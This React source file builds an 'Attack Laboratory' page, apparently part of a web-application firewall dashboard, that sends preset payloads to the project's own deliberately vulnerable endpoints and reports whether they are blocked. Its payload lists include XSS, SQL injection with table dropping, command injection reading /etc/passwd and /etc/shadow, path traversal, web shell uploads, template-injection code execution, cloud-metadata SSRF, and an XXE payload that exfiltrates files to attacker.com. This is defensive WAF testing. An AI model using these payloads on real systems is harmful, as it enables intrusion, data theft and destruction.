// Attack Lab page with modern Apple-inspired design
import React, { useState } from 'react';
import { 
  Bug, 
  Send, 
  Shield, 
  Code, 
  Database, 
  FileText, 
  Terminal,
  AlertTriangle,
  CheckCircle,
  XCircle,
  Copy,
  Globe,
  User,
  Key,
  Upload,
  Lock,
  Zap,
  Activity,
  FileCode,
  Server,
  Cloud,
  Cpu,
  ChevronRight,
  Clock,
  TrendingUp,
  Info,
  PlayCircle,
  StopCircle,
  Repeat,
  CheckSquare
} from 'lucide-react';
import type { TestResult, AttackTest } from '../../types';

const AttackLabPage: React.FC = () => {
  const [selectedTest, setSelectedTest] = useState<string>('xss');
  const [customPayload, setCustomPayload] = useState('');
  const [response, setResponse] = useState<any>(null);
  const [loading, setLoading] = useState(false);
  const [testHistory, setTestHistory] = useState<TestResult[]>([]);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [expandedPayload, setExpandedPayload] = useState<number | null>(null);
  const [autoTest, setAutoTest] = useState(false);

  const attackTests: AttackTest[] = [
    {
      id: 'xss',
      name: 'XSS (Cross-Site Scripting)',
      description: 'Test for XSS vulnerabilities with various encoding and bypass techniques',
      category: 'Injection',
      severity: 'high',
      icon: <Code className="w-5 h-5" />,
      endpoint: '/api/vulnerable/xss',
      method: 'GET',
      payloads: [
        { label: 'Basic Script', value: '<script>alert("XSS")</script>', description: 'Standard script injection' },
        { label: 'IMG Tag', value: '<img src=x onerror=alert("XSS")>', description: 'Image error handler' },
        { label: 'SVG Payload', value: '<svg/onload=alert("XSS")>', description: 'SVG event handler' },
        { label: 'Event Handler', value: '<body onload=alert("XSS")>', description: 'Body event injection' },
        { label: 'JavaScript URL', value: 'javascript:alert("XSS")', description: 'Protocol handler' },
        { label: 'Data URI', value: 'data:text/html,<script>alert("XSS")</script>', description: 'Data URI scheme' },
        { label: 'Encoded', value: '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E', description: 'URL encoded' },
        { label: 'Double Encoded', value: '%253Cscript%253Ealert%2528%2522XSS%2522%2529%253C%252Fscript%253E', description: 'Double URL encoding' }
      ]
    },
    {
      id: 'sqli',
      name: 'SQL Injection',
      description: 'Test for SQL injection vulnerabilities across different databases',
      category: 'Injection',
      severity: 'critical',
      icon: <Database className="w-5 h-5" />,
      endpoint: '/api/vulnerable/sqli',
      method: 'GET',
      payloads: [
        { label: 'Basic OR', value: "' OR '1'='1", description: 'Classic authentication bypass' },
        { label: 'Union Select', value: "' UNION SELECT * FROM users--", description: 'Data extraction' },
        { label: 'Time-based', value: "' OR SLEEP(5)--", description: 'Blind SQL via timing' },
        { label: 'Error-based', value: "' AND 1=CONVERT(int, @@version)--", description: 'Error message extraction' },
        { label: 'Stacked Queries', value: "'; DROP TABLE users--", description: 'Multiple query execution' },
        { label: 'Boolean-based', value: "' AND '1'='1", description: 'Blind SQL via boolean' },
        { label: 'NoSQL', value: '{"$ne": null}', description: 'MongoDB injection' },
        { label: 'Second Order', value: "admin'--", description: 'Stored SQL injection' }
      ]
    },
    {
      id: 'file_upload',
      name: 'File Upload Attack',
      description: 'Test file upload security with malicious files',
      category: 'File Attack',
      severity: 'critical',
      icon: <Upload className="w-5 h-5" />,
      endpoint: '/api/vulnerable/file-upload',
      method: 'POST',
      requiresFile: true,
      payloads: [
        { label: 'PHP Shell', value: 'shell.php', description: 'PHP web shell upload' },
        { label: 'JSP Shell', value: 'shell.jsp', description: 'JSP web shell upload' },
        { label: 'ASPX Shell', value: 'shell.aspx', description: 'ASP.NET shell upload' },
        { label: 'Double Extension', value: 'shell.php.jpg', description: 'Extension bypass' },
        { label: 'Null Byte', value: 'shell.php%00.jpg', description: 'Null byte injection' },
        { label: 'MIME Type', value: 'shell.php', description: 'Content-Type bypass' },
        { label: 'Polyglot', value: 'image.jpg.php', description: 'Polyglot file' },
        { label: 'XXE via SVG', value: 'xxe.svg', description: 'XXE through SVG upload' }
      ]
    },
    {
      id: 'cmd_injection',
      name: 'Command Injection',
      description: 'Test for OS command injection vulnerabilities',
      category: 'Injection',
      severity: 'critical',
      icon: <Terminal className="w-5 h-5" />,
      endpoint: '/api/vulnerable/command-injection',
      method: 'GET',
      payloads: [
        { label: 'Semicolon', value: '; ls -la', description: 'Command separator' },
        { label: 'Pipe', value: '| whoami', description: 'Pipe operator' },
        { label: 'Backticks', value: '`whoami`', description: 'Command substitution' },
        { label: 'Dollar Sign', value: '$(whoami)', description: 'Modern substitution' },
        { label: 'AND', value: '&& cat /etc/passwd', description: 'AND operator' },
        { label: 'OR', value: '|| id', description: 'OR operator' },
        { label: 'Newline', value: '\ncat /etc/shadow', description: 'Line injection' },
        { label: 'Encoded', value: '%0Acat%20/etc/passwd', description: 'URL encoded newline' }
      ]
    },
    {
      id: 'path_traversal',
      name: 'Path Traversal / LFI',
      description: 'Test for directory traversal and local file inclusion',
      category: 'Path Attack',
      severity: 'high',
      icon: <FileText className="w-5 h-5" />,
      endpoint: '/api/vulnerable/path-traversal',
      method: 'GET',
      payloads: [
        { label: 'Unix Traversal', value: '../../../etc/passwd', description: 'Unix path traversal' },
        { label: 'Windows', value: '..\\..\\..\\windows\\system32\\config\\sam', description: 'Windows path' },
        { label: 'URL Encoded', value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', description: 'Encoded dots' },
        { label: 'Double Encoded', value: '%252e%252e%252fetc%252fpasswd', description: 'Double encoding' },
        { label: 'Unicode', value: '..%c0%af..%c0%afetc%c0%afpasswd', description: 'Unicode bypass' },
        { label: 'Null Byte', value: '../../../etc/passwd%00', description: 'Null termination' },
        { label: 'Filter Bypass', value: '....//....//....//etc/passwd', description: 'Filter evasion' },
        { label: 'Absolute Path', value: '/etc/passwd', description: 'Direct path access' }
      ]
    },
    {
      id: 'xxe',
      name: 'XXE (XML External Entity)',
      description: 'Test for XML external entity injection attacks',
      category: 'Injection',
      severity: 'high',
      icon: <FileCode className="w-5 h-5" />,
      endpoint: '/api/vulnerable/xxe',
      method: 'POST',
      payloads: [
        { label: 'File Disclosure', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>', description: 'Local file read' },
        { label: 'SSRF', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://internal.server/">]><root>&test;</root>', description: 'Server-side request' },
        { label: 'Blind XXE', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]>', description: 'Out-of-band' },
        { label: 'Billion Laughs', value: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>', description: 'DoS attack' },
        { label: 'Parameter Entity', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]>', description: 'Parameter entities' }
      ]
    },
    {
      id: 'ssti',
      name: 'Template Injection',
      description: 'Test for server-side template injection',
      category: 'Injection',
      severity: 'high',
      icon: <Code className="w-5 h-5" />,
      endpoint: '/api/vulnerable/ssti',
      method: 'GET',
      payloads: [
        { label: 'Jinja2 Test', value: '{{7*7}}', description: 'Basic math test' },
        { label: 'Jinja2 RCE', value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", description: 'Command execution' },
        { label: 'Twig', value: '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}', description: 'Twig RCE' },
        { label: 'FreeMarker', value: '${7*7}', description: 'FreeMarker test' },
        { label: 'Velocity', value: '#set($x=7*7)$x', description: 'Velocity engine' },
        { label: 'Smarty', value: '{$smarty.version}', description: 'Smarty template' }
      ]
    },
    {
      id: 'ssrf',
      name: 'SSRF (Server-Side Request Forgery)',
      description: 'Test for SSRF vulnerabilities',
      category: 'Network Attack',
      severity: 'high',
      icon: <Server className="w-5 h-5" />,
      endpoint: '/api/vulnerable/ssrf',
      method: 'GET',
      payloads: [
        { label: 'Localhost', value: 'http://127.0.0.1/', description: 'Local access' },
        { label: 'Internal IP', value: 'http://192.168.1.1/', description: 'Private network' },
        { label: 'Cloud Metadata', value: 'http://169.254.169.254/latest/meta-data/', description: 'AWS metadata' },
        { label: 'File Protocol', value: 'file:///etc/passwd', description: 'Local file access' },
        { label: 'Gopher', value: 'gopher://127.0.0.1:25/', description: 'Gopher protocol' },
        { label: 'Dict', value: 'dict://127.0.0.1:11211/stats', description: 'Dict protocol' },
        { label: 'FTP', value: 'ftp://127.0.0.1/', description: 'FTP protocol' },
        { label: 'Redirect', value: 'http://evil.com/redirect?url=http://127.0.0.1', description: 'Open redirect' }
      ]
    }
  ];

  const currentTest = attackTests.find(t => t.id === selectedTest) || attackTests[0];

  const getSeverityStyle = (severity: string) => {
    switch (severity) {
      case 'critical': 
        return {
          bg: 'bg-gradient-to-br from-red-50 to-red-100 dark:from-red-900/20 dark:to-red-800/20',
          text: 'text-red-600 dark:text-red-400',
          badge: 'bg-red-100 text-red-700 dark:bg-red-900/30 dark:text-red-400'
        };
      case 'high': 
        return {
          bg: 'bg-gradient-to-br from-orange-50 to-orange-100 dark:from-orange-900/20 dark:to-orange-800/20',
          text: 'text-orange-600 dark:text-orange-400',
          badge: 'bg-orange-100 text-orange-700 dark:bg-orange-900/30 dark:text-orange-400'
        };
      case 'medium': 
        return {
          bg: 'bg-gradient-to-br from-yellow-50 to-yellow-100 dark:from-yellow-900/20 dark:to-yellow-800/20',
          text: 'text-yellow-600 dark:text-yellow-400',
          badge: 'bg-yellow-100 text-yellow-700 dark:bg-yellow-900/30 dark:text-yellow-400'
        };
      default: 
        return {
          bg: 'bg-gradient-to-br from-blue-50 to-blue-100 dark:from-blue-900/20 dark:to-blue-800/20',
          text: 'text-blue-600 dark:text-blue-400',
          badge: 'bg-blue-100 text-blue-700 dark:bg-blue-900/30 dark:text-blue-400'
        };
    }
  };

  const runTest = async (payload?: string) => {
    setLoading(true);
    setResponse(null);

    const testPayload = payload || customPayload;
    const token = localStorage.getItem('auth_token');
    const startTime = Date.now();

    try {
      let url = currentTest.endpoint;
      let options: RequestInit = {
        method: currentTest.method,
        headers: {
          'Authorization': `Bearer ${token}`
        }
      };

      if (currentTest.requiresFile && selectedFile) {
        const formData = new FormData();
        formData.append('file', selectedFile);
        formData.append('payload', testPayload);
        options.body = formData;
      } else if (currentTest.method === 'GET') {
        url += `?input_data=${encodeURIComponent(testPayload)}`;
      } else {
        options.headers = {
          ...options.headers,
          'Content-Type': 'application/json'
        };
        options.body = JSON.stringify({ payload: testPayload });
      }

      const res = await fetch(url, options);
      const responseTime = Date.now() - startTime;
      
      let data;
      const contentType = res.headers.get('content-type');
      if (contentType && contentType.includes('application/json')) {
        data = await res.json();
      } else {
        data = await res.text();
      }
      
      const result = {
        status: res.status,
        blocked: res.status === 403,
        data: data,
        isJson: contentType && contentType.includes('application/json'),
        responseTime
      };
      
      setResponse(result);
      
      // Add to history
      setTestHistory(prev => [{
        timestamp: new Date().toISOString(),
        test: currentTest.name,
        payload: testPayload.substring(0, 50) + (testPayload.length > 50 ? '...' : ''),
        blocked: result.blocked,
        status: res.status,
        responseTime
      }, ...prev.slice(0, 9)]);
      
    } catch (error) {
      setResponse({
        status: 'error',
        blocked: false,
        data: error instanceof Error ? error.message : 'Unknown error',
        responseTime: Date.now() - startTime
      });
    } finally {
      setLoading(false);
    }
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (e.target.files && e.target.files[0]) {
      setSelectedFile(e.target.files[0]);
    }
  };

  const runAllTests = async () => {
    setAutoTest(true);
    for (const payload of currentTest.payloads || []) {
      await runTest(payload.value);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
    setAutoTest(false);
  };

  return (
    <div className="p-6 space-y-6">
      {/* Header */}
      <div className="flex items-center justify-between mb-6">
        <div className="mb-6">
          <h1 className="section-title">Attack Laboratory</h1>
          <p className="text-gray-500 dark:text-gray-400">
            Test WAF protection against attack vectors
          </p>
        </div>
        <div className="flex items-center gap-3">
          <div className="flex items-center gap-2 px-4 py-2 bg-gray-100 dark:bg-gray-700 rounded-lg">
            <Shield className="w-4 h-4 text-gray-500" />
            <span className="text-sm font-medium text-gray-700 dark:text-gray-300">
              {attackTests.length} Attack Vectors
            </span>
          </div>
          <button
            onClick={runAllTests}
            disabled={loading || autoTest}
            className="btn btn-secondary"
          >
            {autoTest ? (
              <>
                <StopCircle className="w-4 h-4 mr-2" />
                Testing...
              </>
            ) : (
              <>
                <PlayCircle className="w-4 h-4 mr-2" />
                Run All
              </>
            )}
          </button>
        </div>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-4 gap-6">
        {/* Test Selection Sidebar */}
        <div className="xl:col-span-1">
          <div className="card sticky top-6">
            <div className="border-b border-gray-200 dark:border-gray-300 pb-4 mb-4">
              <h2 className="text-lg font-medium text-gray-900 dark:text-white">
                Attack Vectors
              </h2>
            </div>
            <div className="space-y-2 max-h-[calc(100vh-300px)] overflow-y-auto">
              {attackTests.map((test) => {
                const style = getSeverityStyle(test.severity);
                return (
                  <button
                    key={test.id}
                    onClick={() => {
                      setSelectedTest(test.id);
                      setResponse(null);
                      setCustomPayload('');
                    }}
                    className={`w-full text-left p-3 rounded-xl transition-all duration-200 group ${
                      selectedTest === test.id
                        ? 'bg-gradient-to-r from-primary/10 to-primary/5 border border-primary/20 shadow-sm'
                        : 'hover:bg-gray-50 dark:hover:bg-gray-700/50'
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <div className={`p-2 rounded-lg ${style.bg} group-hover:scale-110 transition-transform`}>
                        {React.cloneElement(test.icon as React.ReactElement, {
                          className: `w-4 h-4 ${style.text}`
                        })}
                      </div>
                      <div className="flex-1 min-w-0">
                        <div className="font-medium text-sm text-gray-900 dark:text-gray-100">
                          {test.name}
                        </div>
                        <div className="flex items-center gap-2 mt-1">
                          <span className="text-xs text-gray-500 dark:text-gray-400">
                            {test.category}
                          </span>
                          <span className={`text-xs px-2 py-0.5 rounded-full ${style.badge}`}>
                            {test.severity}
                          </span>
                        </div>
                      </div>
                      {selectedTest === test.id && (
                        <ChevronRight className="w-4 h-4 text-primary mt-2" />
                      )}
                    </div>
                  </button>
                );
              })}
            </div>
          </div>
        </div>

        {/* Main Testing Area */}
        <div className="xl:col-span-3 space-y-6">
          {/* Test Configuration */}
          <div className="card">
            <div className="border-b border-gray-200 dark:border-gray-700 pb-6 mb-6">
              <div className="flex items-start gap-4">
                <div className={`p-3 rounded-xl ${getSeverityStyle(currentTest.severity).bg}`}>
                  {React.cloneElement(currentTest.icon as React.ReactElement, {
                    className: `w-6 h-6 ${getSeverityStyle(currentTest.severity).text}`
                  })}
                </div>
                <div className="flex-1">
                  <h2 className="text-xl font-semibold text-gray-900 dark:text-white">
                    {currentTest.name}
                  </h2>
                  <p className="text-sm text-gray-600 dark:text-gray-400 mt-1">
                    {currentTest.description}
                  </p>
                  <div className="flex items-center gap-3 mt-3">
                    <span className={`text-xs px-3 py-1 rounded-full font-medium ${getSeverityStyle(currentTest.severity).badge}`}>
                      {currentTest.severity.toUpperCase()}
                    </span>
                    <span className="text-xs px-3 py-1 bg-gray-100 dark:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-full">
                      {currentTest.method}
                    </span>
                    <code className="text-xs text-gray-500 dark:text-gray-400 font-mono">
                      {currentTest.endpoint}
                    </code>
                  </div>
                </div>
              </div>
            </div>

            {/* Predefined Payloads */}
            <div className="mb-6">
              <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-4 flex items-center">
                <CheckSquare className="w-4 h-4 mr-2" />
                Predefined Payloads
              </h3>
              <div className="grid gap-3">
                {currentTest.payloads?.map((payload, idx) => (
                  <div
                    key={idx}
                    className="group relative bg-gray-50 dark:bg-gray-700/30 rounded-xl p-4 hover:bg-gray-100 dark:hover:bg-gray-700/50 transition-all duration-200 border border-transparent hover:border-gray-200 dark:hover:border-gray-600"
                  >
                    <div className="flex items-start justify-between gap-4">
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="font-medium text-sm text-gray-900 dark:text-white">
                            {payload.label}
                          </span>
                          <span className="text-xs text-gray-500 dark:text-gray-400">
                            • {payload.description}
                          </span>
                        </div>
                        <div 
                          className="text-xs text-gray-600 dark:text-gray-400 font-mono bg-gray-900/5 dark:bg-gray-900/30 px-2 py-1 rounded cursor-pointer"
                          onClick={() => setExpandedPayload(expandedPayload === idx ? null : idx)}
                        >
                          {expandedPayload === idx ? payload.value : (
                            payload.value.length > 60 
                              ? `${payload.value.substring(0, 60)}...` 
                              : payload.value
                          )}
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <button
                          onClick={() => copyPayload(payload.value)}
                          className="p-2 rounded-lg hover:bg-gray-200 dark:hover:bg-gray-600 transition-colors opacity-0 group-hover:opacity-100"
                          title="Copy payload"
                        >
                          <Copy className="w-4 h-4 text-gray-500 dark:text-gray-400" />
                        </button>
                        <button
                          onClick={() => runTest(payload.value)}
                          disabled={loading}
                          className="btn-primary py-2 px-3"
                          title="Run test"
                        >
                          <Zap className="w-4 h-4" />
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Custom Payload */}
            <div>
              <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-4 flex items-center">
                <Terminal className="w-4 h-4 mr-2" />
                Custom Payload
              </h3>
              {currentTest.requiresFile && (
                <div className="mb-3">
                  <input
                    type="file"
                    onChange={handleFileChange}
                    className="hidden"
                    id="file-upload"
                  />
                  <label
                    htmlFor="file-upload"
                    className="cursor-pointer flex items-center gap-3 p-3 bg-gray-50 dark:bg-gray-700/30 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700/50 transition-colors border-2 border-dashed border-gray-300 dark:border-gray-600"
                  >
                    <Upload className="w-5 h-5 text-gray-400" />
                    <span className="text-sm text-gray-600 dark:text-gray-400">
                      {selectedFile ? selectedFile.name : 'Choose file to upload...'}
                    </span>
                  </label>
                </div>
              )}
              <div className="flex gap-3">
                <input
                  type="text"
                  value={customPayload}
                  onChange={(e) => setCustomPayload(e.target.value)}
                  placeholder="Enter custom payload..."
                  className="flex-1 input-field"
                  onKeyPress={(e) => e.key === 'Enter' && customPayload && runTest()}
                />
                <button
                  onClick={() => runTest()}
                  disabled={!customPayload || loading || (currentTest.requiresFile && !selectedFile)}
                  className="btn-primary"
                >
                  {loading ? (
                    <div className="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent" />
                  ) : (
                    <>
                      <Send className="w-4 h-4 mr-2" />
                      Execute
                    </>
                  )}
                </button>
              </div>
            </div>

            {/* Response */}
            {response && (
              <div className="mt-6 pt-6 border-t border-gray-200 dark:border-gray-700">
                <h3 className="text-sm font-medium text-gray-700 dark:text-gray-300 mb-4">
                  Test Result
                </h3>
                <div className={`rounded-xl overflow-hidden ${
                  response.blocked
                    ? 'bg-gradient-to-r from-green-50 to-emerald-50 dark:from-green-900/20 dark:to-emerald-900/20 border border-green-200 dark:border-green-800'
                    : 'bg-gradient-to-r from-red-50 to-pink-50 dark:from-red-900/20 dark:to-pink-900/20 border border-red-200 dark:border-red-800'
                }`}>
                  <div className="p-4">
                    <div className="flex items-center justify-between mb-3">
                      <div className="flex items-center gap-3">
                        {response.blocked ? (
                          <>
                            <div className="p-2 bg-green-100 dark:bg-green-900/30 rounded-lg">
                              <CheckCircle className="w-5 h-5 text-green-600 dark:text-green-400" />
                            </div>
                            <span className="font-medium text-green-700 dark:text-green-300">
                              Successfully Blocked by WAF
                            </span>
                          </>
                        ) : (
                          <>
                            <div className="p-2 bg-red-100 dark:bg-red-900/30 rounded-lg">
                              <XCircle className="w-5 h-5 text-red-600 dark:text-red-400" />
                            </div>
                            <span className="font-medium text-red-700 dark:text-red-300">
                              Attack Bypassed WAF Protection
                            </span>
                          </>
                        )}
                      </div>
                      <div className="flex items-center gap-4 text-sm">
                        <span className="text-gray-600 dark:text-gray-400">
                          Status: <strong className="text-gray-900 dark:text-white">{response.status}</strong>
                        </span>
                        <span className="text-gray-600 dark:text-gray-400">
                          <Clock className="w-3 h-3 inline mr-1" />
                          <strong className="text-gray-900 dark:text-white">{response.responseTime}ms</strong>
                        </span>
                      </div>
                    </div>
                  </div>
                  <div className="bg-gray-900 p-4">
                    <pre className="text-xs text-gray-300 font-mono overflow-x-auto">
                      {response.isJson ? JSON.stringify(response.data, null, 2) : response.data}
                    </pre>
                  </div>
                </div>
              </div>
            )}
          </div>

          {/* Test History */}
          {testHistory.length > 0 && (
            <div className="card">
              <div className="flex items-center justify-between mb-6">
                <h3 className="text-lg font-semibold text-gray-900 dark:text-white">
                  Recent Tests
                </h3>
                <button
                  onClick={() => setTestHistory([])}
                  className="text-sm text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-300"
                >
                  Clear History
                </button>
              </div>
              <div className="space-y-2">
                {testHistory.map((result, idx) => (
                  <div
                    key={idx}
                    className="flex items-center justify-between p-3 bg-gray-50 dark:bg-gray-700/30 rounded-lg hover:bg-gray-100 dark:hover:bg-gray-700/50 transition-colors"
                  >
                    <div className="flex items-center gap-3">
                      <div className={`p-1.5 rounded-lg ${
                        result.blocked
                          ? 'bg-green-100 dark:bg-green-900/30'
                          : 'bg-red-100 dark:bg-red-900/30'
                      }`}>
                        {result.blocked ? (
                          <CheckCircle className="w-4 h-4 text-green-600 dark:text-green-400" />
                        ) : (
                          <XCircle className="w-4 h-4 text-red-600 dark:text-red-400" />
                        )}
                      </div>
                      <div>
                        <div className="text-sm font-medium text-gray-900 dark:text-white">
                          {result.test}
                        </div>
                        <div className="text-xs text-gray-500 dark:text-gray-400 font-mono">
                          {result.payload}
                        </div>
                      </div>
                    </div>
                    <div className="text-right">
                      <div className="text-xs text-gray-500 dark:text-gray-400">
                        {new Date(result.timestamp).toLocaleTimeString()}
                      </div>
                      <div className="text-xs font-medium text-gray-600 dark:text-gray-400">
                        {result.responseTime}ms
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default AttackLabPage;